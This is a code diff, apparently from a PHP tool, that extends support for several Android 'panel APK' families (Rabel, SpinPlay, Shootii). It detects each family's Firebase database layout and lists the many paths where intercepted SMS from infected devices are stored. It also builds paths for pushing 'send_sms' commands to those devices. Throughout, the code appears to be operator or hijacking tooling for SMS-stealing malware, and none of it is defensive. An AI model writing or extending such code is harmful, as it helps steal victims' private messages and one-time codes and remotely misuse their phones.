@@ -185,6 +185,13 @@ function rebel_firebase_auth_key(string $url, string $key): string
 function rebel_detect_schema(?array $roots, string $url = ''): string
 {
     if (is_array($roots)) {
+        if (array_key_exists('Verify_Device', $roots) || array_key_exists('verify_device', $roots)) {
+            return 'shootii';
+        }
+        if (array_key_exists('user_list', $roots) || array_key_exists('user_data', $roots)
+            || array_key_exists('All_Users', $roots) || array_key_exists('All_User', $roots)) {
+            return 'rabel';
+        }
         if (array_key_exists('messages', $roots)) {
             return 'rabel';
         }
@@ -195,13 +202,48 @@ function rebel_detect_schema(?array $roots, string $url = ''): string
             return 'spinplay';
         }
     }
-    if ($url !== '' && stripos($url, 'rabel') !== false) {
-        return 'rabel';
+    if ($url !== '') {
+        if (preg_match('/rabel|raand|user_list|demon|jdhd|rto9|raki/i', $url)) {
+            return 'rabel';
+        }
+        if (preg_match('/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i', $url)) {
+            return 'shootii';
+        }
+        if (stripos($url, 'rabel') !== false) {
+            return 'rabel';
+        }
     }
     return 'spinplay';
 }
 
-/** All SMS read paths — rebel.py uses messages/{id}; SpinPlay uses devices/.../all_sms */
+/** Panel device nodes from APK batch scan */
+function rebel_panel_device_nodes(): array
+{
+    return [
+        'clients', 'devices', 'devices_status', 'Verify_Device', 'user_list', 'user_data',
+        'user_sms', 'users', 'All_Users', 'All_User', 'AllClients', 'all_clients',
+        'online_devices', 'online_users', 'clients_list', 'client_list', 'online_status',
+        'device_list', 'devices_list', 'device_data', 'registered_users', 'active_devices',
+        'active_users', 'connected_devices', 'device_status',
+    ];
+}
+
+/** Per-device SMS suffix paths seen across panel APKs */
+function rebel_panel_sms_suffixes(): array
+{
+    return [
+        'all_sms', 'new_sms', 'sms', 'messages', 'sms_inbox', 'inbox',
+        'received_sms', 'sent_sms', 'sms_list', 'user_sms', 'msg_list',
+    ];
+}
+
+/** Global SMS roots keyed by device id */
+function rebel_panel_sms_global_nodes(): array
+{
+    return ['messages', 'user_sms', 'sms', 'all_sms', 'new_sms', 'sms_inbox', 'inbox'];
+}
+
+/** All SMS read paths — rebel.py messages/{id} + SpinPlay/Shootii/Rabel fallbacks */
 function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients'): array
 {
     $id = trim($deviceId);
@@ -210,38 +252,50 @@ function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', 
     }
 
     $node = $deviceNode !== '' ? $deviceNode : 'clients';
-    $bases = array_values(array_unique([$node, 'clients', 'devices', 'devices_status']));
+    $bases = array_values(array_unique(array_merge(
+        [$node],
+        rebel_panel_device_nodes()
+    )));
     $paths = [];
+    $suffixes = rebel_panel_sms_suffixes();
 
-    // Rabel / rebel.py primary path first
-    $paths[] = 'messages/' . $id;
+    foreach (rebel_panel_sms_global_nodes() as $global) {
+        $paths[] = $global . '/' . $id;
+    }
+
+    if ($schema === 'shootii') {
+        foreach (array_values(array_unique(['Verify_Device', $node, 'clients', 'devices'])) as $n) {
+            if ($n === '') {
+                continue;
+            }
+            foreach ($suffixes as $sfx) {
+                $paths[] = $n . '/' . $id . '/' . $sfx;
+            }
+        }
+        return array_values(array_unique($paths));
+    }
+
+    if ($schema === 'spinplay') {
+        $preferred = [];
+        foreach (array_values(array_unique(['devices', 'devices_status', $node, 'clients'])) as $n) {
+            if ($n === '') {
+                continue;
+            }
+            foreach (['all_sms', 'new_sms', 'sms', 'messages'] as $sfx) {
+                $preferred[] = $n . '/' . $id . '/' . $sfx;
+            }
+        }
+        $preferred[] = 'messages/' . $id;
+        return array_values(array_unique($preferred));
+    }
 
     foreach ($bases as $n) {
         if ($n === '') {
             continue;
         }
-        $paths[] = $n . '/' . $id . '/all_sms';
-        $paths[] = $n . '/' . $id . '/new_sms';
-        $paths[] = $n . '/' . $id . '/sms';
-        $paths[] = $n . '/' . $id . '/messages';
-    }
-
-    if ($schema === 'rabel') {
-        // Keep messages/ first; already added
-    } elseif ($schema === 'spinplay') {
-        // Prefer device-node paths before global messages/
-        $preferred = [];
-        foreach ($bases as $n) {
-            if ($n === '') {
-                continue;
-            }
-            $preferred[] = $n . '/' . $id . '/all_sms';
-            $preferred[] = $n . '/' . $id . '/new_sms';
-            $preferred[] = $n . '/' . $id . '/sms';
-            $preferred[] = $n . '/' . $id . '/messages';
+        foreach ($suffixes as $sfx) {
+            $paths[] = $n . '/' . $id . '/' . $sfx;
         }
-        $preferred[] = 'messages/' . $id;
-        $paths = array_values(array_unique($preferred));
     }
 
     return array_values(array_unique($paths));
@@ -259,12 +313,21 @@ function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel',
     $node = $deviceNode !== '' ? $deviceNode : 'clients';
 
     if ($schema === 'spinplay') {
-        foreach (array_values(array_unique([$node, 'devices', 'clients'])) as $n) {
+        foreach (array_values(array_unique([$node, 'devices', 'clients', 'Verify_Device'])) as $n) {
             $out[] = ['path' => $n . '/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
         }
         $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+    } elseif ($schema === 'shootii') {
+        foreach (array_values(array_unique(['Verify_Device', $node, 'clients', 'devices'])) as $n) {
+            if ($n === '') {
+                continue;
+            }
+            $out[] = ['path' => $n . '/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
+            $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
+            $out[] = ['path' => $n . '/' . $id . '/commands/send_sms', 'type' => 'spinplay'];
+        }
     } else {
-        foreach (array_values(array_unique(['clients', $node])) as $n) {
+        foreach (array_values(array_unique(['clients', $node, 'user_list', 'user_data', 'devices'])) as $n) {
             if ($n === '') {
                 continue;
             }
